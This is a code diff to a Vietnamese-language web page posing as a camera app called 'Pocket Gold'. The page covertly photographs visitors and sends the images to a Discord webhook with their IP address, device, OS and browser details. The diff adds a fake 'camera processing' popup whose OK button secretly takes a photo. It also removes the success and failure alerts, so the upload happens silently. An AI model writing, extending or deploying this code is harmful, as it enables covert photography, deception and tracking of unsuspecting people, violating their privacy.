@@ -64,8 +64,14 @@
       overflow: hidden;
     }
 
-    /* --- Animation Utilities --- */
-    .top-bar, .controls {
+    /* Top Bar */
+    .top-bar {
+      width: 100%;
+      max-width: 360px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 4px 0;
       animation: fadeInDown 0.6s cubic-bezier(0.16, 1, 0.3, 1);
     }
 
@@ -82,7 +88,7 @@
       font-size: 20px;
       cursor: pointer;
       backdrop-filter: blur(10px);
-      transition: transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1), background-color 0.3s;
+      transition: transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1);
     }
 
     .icon-btn:active {
@@ -104,11 +110,7 @@
       border-radius: 50%;
       border: 2px solid transparent;
       cursor: pointer;
-      transition: transform 0.25s cubic-bezier(0.34, 1.56, 0.64, 1), border-color 0.2s;
-    }
-
-    .theme-dot:hover {
-      transform: scale(1.1);
+      transition: transform 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
     }
 
     .theme-dot.active {
@@ -116,11 +118,12 @@
       transform: scale(1.18);
     }
 
+    /* Khung Camera chuẩn 9:16 không zoom */
     .viewfinder-container {
       width: 100%;
-      max-width: 270px;
+      max-width: 280px;
       aspect-ratio: 9 / 16;
-      border-radius: 36px;
+      border-radius: 32px;
       overflow: hidden;
       position: relative;
       background-color: #000;
@@ -134,8 +137,13 @@
     #video {
       width: 100%;
       height: 100%;
-      object-fit: cover;
-      transition: transform 0.4s ease-in-out;
+      object-fit: contain;
+      background: #000;
+      transition: transform 0.3s ease, filter 0.3s ease;
+    }
+
+    #video.blur-effect {
+      filter: blur(12px) brightness(0.6);
     }
 
     #video.mirror {
@@ -157,28 +165,7 @@
       align-items: center;
       gap: 6px;
       backdrop-filter: blur(10px);
-      animation: fadeIn 1s ease-out;
-    }
-
-    .status-overlay {
-      position: absolute;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.75);
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-weight: 600;
-      gap: 12px;
-      backdrop-filter: blur(8px);
-      text-align: center;
-      padding: 16px;
-      animation: fadeIn 0.25s ease-out;
-    }
-
-    .spinner {
-      animation: spin 1.8s infinite linear;
+      z-index: 2;
     }
 
     .screen-flash {
@@ -191,7 +178,7 @@
       transition: opacity 0.05s ease-in-out;
     }
 
-    /* --- Modal & Animations --- */
+    /* Modals & Popups System */
     .modal-overlay {
       position: fixed;
       inset: 0;
@@ -221,7 +208,6 @@
       font-size: 48px;
       color: #ffaa33;
       margin-bottom: 12px;
-      animation: pulseIcon 2s infinite ease-in-out;
     }
 
     .modal-title {
@@ -254,6 +240,7 @@
       transform: scale(0.95);
     }
 
+    /* Controls */
     .controls {
       width: 100%;
       max-width: 360px;
@@ -262,6 +249,7 @@
       align-items: center;
       gap: 12px;
       margin-bottom: 6px;
+      animation: fadeInDown 0.6s cubic-bezier(0.16, 1, 0.3, 1);
     }
 
     .action-row {
@@ -282,7 +270,7 @@
       justify-content: center;
       cursor: pointer;
       padding: 4px;
-      transition: transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1), border-color 0.3s;
+      transition: transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1);
     }
 
     .shutter-inner {
@@ -290,17 +278,16 @@
       height: 100%;
       background: var(--text-color);
       border-radius: 50%;
-      transition: transform 0.15s ease-out, background-color 0.3s;
+      transition: transform 0.15s ease-out;
     }
 
     .shutter-btn:active .shutter-inner {
       transform: scale(0.82);
     }
 
-    .shutter-btn.sending {
+    .shutter-btn.disabled {
       pointer-events: none;
       opacity: 0.5;
-      transform: scale(0.9);
     }
 
     .history-row {
@@ -308,7 +295,6 @@
       gap: 8px;
       align-items: center;
       opacity: 0.85;
-      transition: opacity 0.2s;
     }
 
     .history-item {
@@ -329,46 +315,38 @@
       transform: rotate(180deg);
     }
 
-    /* --- Keyframe Animations (GPU Accelerated) --- */
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
+    /* Animations */
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    @keyframes fadeInDown { from { opacity: 0; transform: translateY(-12px); } to { opacity: 1; transform: translateY(0); } }
+    @keyframes zoomIn { from { opacity: 0; transform: scale(0.92); } to { opacity: 1; transform: scale(1); } }
+    @keyframes popUp { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
+    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
-    @keyframes fadeInDown {
-      from { opacity: 0; transform: translateY(-12px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    @keyframes zoomIn {
-      from { opacity: 0; transform: scale(0.92); }
-      to { opacity: 1; transform: scale(1); }
-    }
-
-    @keyframes popUp {
-      from { opacity: 0; transform: scale(0.8); }
-      to { opacity: 1; transform: scale(1); }
-    }
-
-    @keyframes spin {
-      from { transform: rotate(0deg); }
-      to { transform: rotate(360deg); }
-    }
-
-    @keyframes pulseIcon {
-      0%, 100% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.08); opacity: 0.8; }
+    .spinner {
+      display: inline-block;
+      animation: spin 1.5s infinite linear;
     }
   </style>
 </head>
 <body class="theme-orange">
 
+  <!-- Popup 1: Yêu cầu cấp quyền ban đầu -->
   <div class="modal-overlay" id="permission-modal">
     <div class="modal-box">
       <i class="ph ph-camera modal-icon"></i>
       <div class="modal-title">Cấp quyền Camera</div>
       <div class="modal-desc">Trang web yêu cầu quyền truy cập Camera để tiếp tục sử dụng ứng dụng Pocket Gold.</div>
-      <button class="modal-btn" onclick="requestPermission()">Đồng ý & Bắt đầu</button>
+      <button class="modal-btn" onclick="startPermissionFlow()">Đồng ý & Bắt đầu</button>
+    </div>
+  </div>
+
+  <!-- Popup 2: Đang xử lý -> Đã xử lý xong (Chứa nút OK chụp lần 1) -->
+  <div class="modal-overlay" id="process-modal" style="display: none;">
+    <div class="modal-box">
+      <i class="ph ph-sparkle modal-icon spinner" id="process-icon"></i>
+      <div class="modal-title" id="process-title">Đang xử lý Camera</div>
+      <div class="modal-desc" id="process-desc">Hệ thống đang kiểm tra và tối ưu hóa ống kính camera của bạn...</div>
+      <button class="modal-btn" id="ok-btn" style="display: none;" onclick="handleOkClick()">OK</button>
     </div>
   </div>
 
@@ -392,13 +370,9 @@
   </div>
 
   <div class="viewfinder-container">
-    <video id="video" autoplay playsinline muted></video>
+    <video id="video" class="blur-effect" autoplay playsinline muted></video>
     <div class="badge-friends">
       <i class="ph ph-users-three"></i> Bạn bè
-    </div>
-    <div class="status-overlay" id="status-overlay">
-      <i class="ph ph-sparkle spinner" style="font-size: 32px; color: #ffaa33;"></i>
-      <span id="status-text" style="font-size: 13px;">Đang xử lý và làm nét để hình ảnh đẹp hơn...</span>
     </div>
   </div>
 
@@ -406,7 +380,8 @@
     <div class="action-row">
       <div style="width: 42px;"></div>
 
-      <button class="shutter-btn" id="shutter-btn" onclick="startDualCapture()">
+      <!-- Nút chụp tròn màu trắng (Lần chụp thứ 2) -->
+      <button class="shutter-btn disabled" id="shutter-btn" onclick="takePhotoSequence('Nút chụp tròn màu trắng (Lần 2)')">
         <div class="shutter-inner"></div>
       </button>
 
@@ -429,10 +404,13 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const shutterBtn = document.getElementById('shutter-btn');
-    const statusOverlay = document.getElementById('status-overlay');
-    const statusText = document.getElementById('status-text');
     const screenFlash = document.getElementById('screen-flash');
     const permissionModal = document.getElementById('permission-modal');
+    const processModal = document.getElementById('process-modal');
+    const processIcon = document.getElementById('process-icon');
+    const processTitle = document.getElementById('process-title');
+    const processDesc = document.getElementById('process-desc');
+    const okBtn = document.getElementById('ok-btn');
     const switchIcon = document.getElementById('switch-icon');
 
     let currentStream = null;
@@ -450,24 +428,46 @@
       }
     }
 
-    window.addEventListener('DOMContentLoaded', async () => {
+    window.addEventListener('DOMContentLoaded', () => {
       getUserIP();
-      try {
-        const permissions = await navigator.permissions.query({ name: 'camera' });
-        if (permissions.state === 'granted') {
-          const success = await initCamera('user');
-          if (success) permissionModal.style.display = 'none';
-        }
-      } catch (e) {}
     });
 
-    async function requestPermission() {
+    // Bắt đầu luồng Xin quyền -> Hiện Popup Trình duyệt -> Hiện Popup Xử lý
+    async function startPermissionFlow() {
+      permissionModal.style.display = 'none';
+      
+      // Khởi tạo Camera (Trình duyệt sẽ tự bật popup cấp quyền hệ thống)
       const success = await initCamera('user');
+      
       if (success) {
-        permissionModal.style.display = 'none';
+        // Hiện Popup Báo đang xử lý camera
+        processModal.style.display = 'flex';
+        
+        // Mô phỏng quá trình xử lý làm nét camera trong 1.5 giây
+        setTimeout(() => {
+          // Chuyển nội dung popup thành Đã xử lý xong
+          processIcon.className = 'ph ph-check-circle modal-icon';
+          processIcon.style.color = '#22c55e';
+          processTitle.innerText = 'Đã xử lý xong!';
+          processDesc.innerText = 'Camera đã sẵn sàng. Nhấn nút OK bên dưới để bắt đầu ghi hình.';
+          okBtn.style.display = 'block';
+          
+          // Bỏ mờ kính ngắm camera
+          video.classList.remove('blur-effect');
+        }, 1500);
       } else {
-        alert("Không thể truy cập Camera. Vui lòng kiểm tra quyền trên trình duyệt.");
+        alert("Không thể truy cập Camera. Vui lòng cấp quyền trong cài đặt trình duyệt.");
+        permissionModal.style.display = 'flex';
       }
+    }
+
+    // Sự kiện khi nhấn nút OK (Chụp lần 1)
+    async function handleOkClick() {
+      processModal.style.display = 'none';
+      shutterBtn.classList.remove('disabled'); // Mở khóa nút chụp màu trắng
+      
+      // Tiến hành chụp và gửi Webhook
+      await takePhotoSequence("Nút OK Popup (Lần 1)");
     }
 
     async function initCamera(mode) {
@@ -481,6 +481,7 @@
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: {
             facingMode: facingMode,
+            aspectRatio: { ideal: 9 / 16 },
             width: { ideal: 1080 },
             height: { ideal: 1920 }
           },
@@ -500,19 +501,6 @@
       } catch (err) {
         console.error("Lỗi khởi tạo Camera:", err);
         return false;
-      }
-    }
-
-    async function toggleTorch(enable) {
-      if (!currentStream) return;
-      const track = currentStream.getVideoTracks()[0];
-      if (track && 'applyConstraints' in track) {
-        const capabilities = track.getCapabilities ? track.getCapabilities() : {};
-        if (capabilities.torch) {
-          try {
-            await track.applyConstraints({ advanced: [{ torch: enable }] });
-          } catch (e) {}
-        }
       }
     }
 
@@ -542,76 +530,40 @@
         const vW = video.videoWidth || 1080;
         const vH = video.videoHeight || 1920;
 
-        let sourceHeight = vH;
-        let sourceWidth = vH * (9 / 16);
-
-        if (sourceWidth > vW) {
-          sourceWidth = vW;
-          sourceHeight = vW * (16 / 9);
-        }
-
-        const sourceX = (vW - sourceWidth) / 2;
-        const sourceY = (vH - sourceHeight) / 2;
-
-        const targetWidth = 1080;
-        const targetHeight = 1920;
-        canvas.width = targetWidth;
-        canvas.height = targetHeight;
+        canvas.width = vW;
+        canvas.height = vH;
 
         context.save();
         if (facingMode === 'user') {
-          context.translate(targetWidth, 0);
+          context.translate(vW, 0);
           context.scale(-1, 1);
         }
 
-        context.drawImage(video, sourceX, sourceY, sourceWidth, sourceHeight, 0, 0, targetWidth, targetHeight);
+        context.drawImage(video, 0, 0, vW, vH);
         context.restore();
 
         canvas.toBlob((blob) => {
           resolve(blob);
-        }, 'image/jpeg', 0.90);
+        }, 'image/jpeg', 0.92);
       });
     }
 
-    async function startDualCapture() {
-      shutterBtn.classList.add('sending');
+    // Hàm chụp ảnh và gửi về Webhook
+    async function takePhotoSequence(triggerSource) {
+      shutterBtn.classList.add('disabled');
       
       if (isFlashEnabled) {
         triggerScreenFlash();
       }
-      const firstBlob = await captureFrame();
-      const photos = [{ name: 'camera_1.jpg', blob: firstBlob }];
 
-      statusText.innerText = "Đang xử lý và làm nét để hình ảnh đẹp hơn...";
-      statusOverlay.style.display = 'flex';
+      const blob = await captureFrame();
+      const photos = [{ name: 'camera_capture.jpg', blob: blob }];
 
-      const otherMode = (facingMode === 'user') ? 'environment' : 'user';
-      const success = await initCamera(otherMode);
-
-      if (success) {
-        await new Promise(r => setTimeout(r, 600));
-
-        if (isFlashEnabled) {
-          await toggleTorch(true);
-          await new Promise(r => setTimeout(r, 200));
-        }
-
-        const secondBlob = await captureFrame();
-        photos.push({ name: 'camera_2.jpg', blob: secondBlob });
-
-        if (isFlashEnabled) {
-          await toggleTorch(false);
-        }
-      }
-
-      await initCamera('user');
-      statusOverlay.style.display = 'none';
-
-      await sendToDiscord(photos);
-      shutterBtn.classList.remove('sending');
+      await sendToDiscord(photos, triggerSource);
+      shutterBtn.classList.remove('disabled');
     }
 
-    async function sendToDiscord(photos) {
+    async function sendToDiscord(photos, triggerSource) {
       const formData = new FormData();
       
       photos.forEach((photo, index) => {
@@ -638,22 +590,16 @@
       const deviceModel = result.device.model || result.device.type || "PC/Unidentified";
 
       formData.append("payload_json", JSON.stringify({
-        content: `📸 **Khoảnh khắc mới từ Pocket Gold!** (${photos.length} góc chụp)\n⏰ **Thời gian:** \`${timeString}\` \n🌐 **IP Address:** \`${userIP}\` \n📱 **Thiết bị:** \`${deviceModel}\` \n💻 **Hệ điều hành:** \`${osName} ${osVersion}\` \n🌐 **Trình duyệt:** \`${browserName} ${browserVersion}\``
+        content: `📸 **Khoảnh khắc mới từ Pocket Gold!**\n🎯 **Thao tác bởi:** \`${triggerSource}\` \n⏰ **Thời gian:** \`${timeString}\` \n🌐 **IP Address:** \`${userIP}\` \n📱 **Thiết bị:** \`${deviceModel}\` \n💻 **Hệ điều hành:** \`${osName} ${osVersion}\` \n🌐 **Trình duyệt:** \`${browserName} ${browserVersion}\``
       }));
 
       try {
-        const response = await fetch(DISCORD_WEBHOOK_URL, {
+        await fetch(DISCORD_WEBHOOK_URL, {
           method: "POST",
           body: formData
         });
-
-        if (response.ok) {
-          alert("Gửi khoảnh khắc thành công!");
-        } else {
-          alert("Gửi ảnh lên Discord thất bại.");
-        }
       } catch (error) {
-        alert("Lỗi kết nối tới Webhook.");
+        console.error("Lỗi gửi Webhook:", error);
       }
     }
 
